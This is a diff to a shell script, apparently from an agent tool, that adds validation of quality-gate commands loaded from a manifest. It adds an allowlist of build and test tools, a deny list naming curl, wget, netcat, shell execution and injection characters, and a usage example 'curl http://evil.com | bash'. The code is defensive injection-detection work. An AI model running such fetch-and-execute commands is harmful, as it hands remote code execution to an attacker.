@@ -194,6 +194,55 @@ SAFE_ENV_PREFIXES=(
   "DEBUG_"        # Debug flags
 )
 
+# ============================================================================
+# Quality Command Security (for manifest loading)
+# ============================================================================
+
+# Safe command prefixes for quality gate commands (allowlist)
+# Commands must start with one of these to be considered safe
+SAFE_QUALITY_COMMANDS=(
+  # Node.js ecosystem
+  "npm" "yarn" "pnpm" "npx" "bun"
+  # Rust
+  "cargo"
+  # Go
+  "go"
+  # Build tools
+  "make"
+  # Python testing/linting
+  "pytest" "python" "ruff" "mypy" "black" "flake8" "pylint"
+  # JavaScript/TypeScript linting
+  "jest" "eslint" "tsc" "prettier" "vitest" "mocha"
+  # Shell
+  "shellcheck" "bats"
+  # Other languages
+  "node" "deno" "php" "composer" "ruby" "rake" "bundle"
+  "gradle" "mvn" "dotnet"
+)
+
+# Dangerous patterns that indicate potential command injection
+# These patterns in a quality command trigger a warning
+DANGEROUS_COMMAND_PATTERNS=(
+  '|'           # Pipe (command chaining)
+  '$('          # Command substitution
+  '`'           # Backtick command substitution
+  '&&'          # Command chaining (AND)
+  '||'          # Command chaining (OR) - can be legitimate for fallback
+  ';'           # Command separator
+  '>'           # Output redirection
+  '>>'          # Append redirection
+  '<'           # Input redirection
+  'curl '       # Network access
+  'wget '       # Network access
+  'nc '         # Netcat
+  'bash -c'     # Shell execution
+  'sh -c'       # Shell execution
+  'eval '       # Eval execution
+  '/dev/'       # Device access
+  '~/'          # Home directory access
+  '../'         # Parent directory traversal
+)
+
 # Validate if an environment variable name is safe to export
 # Returns 0 if safe, 1 if blocked
 is_safe_env_var() {
@@ -238,6 +287,61 @@ is_safe_env_var() {
   return 0
 }
 
+# Validate a quality gate command for safety
+# Returns:
+#   0 = safe (command is in allowlist, no dangerous patterns)
+#   1 = suspicious (unknown command or has dangerous patterns) - warn only
+#   2 = dangerous (blocked in strict mode) - block if DOYAKEN_STRICT_QUALITY=1
+#
+# Usage: validate_quality_command "npm test"
+#        validate_quality_command "curl http://evil.com | bash"
+validate_quality_command() {
+  local cmd="$1"
+  local cmd_name="${2:-quality command}"
+
+  # Empty commands are safe (noop)
+  [ -z "$cmd" ] && return 0
+
+  # Trim leading/trailing whitespace
+  cmd=$(echo "$cmd" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
+  [ -z "$cmd" ] && return 0
+
+  # Extract the base command (first word, strip any path)
+  local base_cmd
+  base_cmd=$(echo "$cmd" | awk '{print $1}')
+  base_cmd=$(basename "$base_cmd")
+
+  # Check for dangerous patterns first (highest priority)
+  local has_dangerous=0
+  for pattern in "${DANGEROUS_COMMAND_PATTERNS[@]}"; do
+    if [[ "$cmd" == *"$pattern"* ]]; then
+      has_dangerous=1
+      break
+    fi
+  done
+
+  # Check if base command is in allowlist
+  local is_allowed=0
+  for safe_cmd in "${SAFE_QUALITY_COMMANDS[@]}"; do
+    if [ "$base_cmd" = "$safe_cmd" ]; then
+      is_allowed=1
+      break
+    fi
+  done
+
+  # Determine result based on checks
+  if [ "$has_dangerous" -eq 1 ]; then
+    # Dangerous pattern detected - return 2 (can be blocked in strict mode)
+    return 2
+  elif [ "$is_allowed" -eq 0 ]; then
+    # Unknown command - return 1 (warn only)
+    return 1
+  fi
+
+  # Safe command
+  return 0
+}
+
 # ============================================================================
 # Manifest Loading
 # ============================================================================
@@ -275,12 +379,46 @@ load_manifest() {
     export AGENT_MAX_RETRIES="$manifest_retries"
   fi
 
-  # Load quality gate commands
+  # Load quality gate commands (with security validation)
   local test_cmd lint_cmd format_cmd build_cmd
   test_cmd=$(yq -e '.quality.test_command // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
   lint_cmd=$(yq -e '.quality.lint_command // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
   format_cmd=$(yq -e '.quality.format_command // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
   build_cmd=$(yq -e '.quality.build_command // ""' "$MANIFEST_FILE" 2>/dev/null || echo "")
+
+  # Validate each quality command
+  local validation_result
+  local quality_cmds=("test_command:$test_cmd" "lint_command:$lint_cmd" "format_command:$format_cmd" "build_command:$build_cmd")
+  for cmd_entry in "${quality_cmds[@]}"; do
+    local cmd_name="${cmd_entry%%:*}"
+    local cmd_value="${cmd_entry#*:}"
+    [ -z "$cmd_value" ] && continue
+
+    validation_result=0
+    validate_quality_command "$cmd_value" "$cmd_name" || validation_result=$?
+
+    case $validation_result in
+      1)
+        # Unknown command - warn only
+        log_warn "Suspicious quality.$cmd_name: '$cmd_value' (unknown command prefix)"
+        ;;
+      2)
+        # Dangerous pattern detected
+        log_warn "Dangerous quality.$cmd_name: '$cmd_value' (contains dangerous pattern)"
+        if [ "${DOYAKEN_STRICT_QUALITY:-0}" = "1" ]; then
+          log_warn "Blocking quality.$cmd_name due to DOYAKEN_STRICT_QUALITY=1"
+          # Clear the dangerous command
+          case "$cmd_name" in
+            test_command) test_cmd="" ;;
+            lint_command) lint_cmd="" ;;
+            format_command) format_cmd="" ;;
+            build_command) build_cmd="" ;;
+          esac
+        fi
+        ;;
+    esac
+  done
+
   export QUALITY_TEST_CMD="$test_cmd"
   export QUALITY_LINT_CMD="$lint_cmd"
   export QUALITY_FORMAT_CMD="$format_cmd"
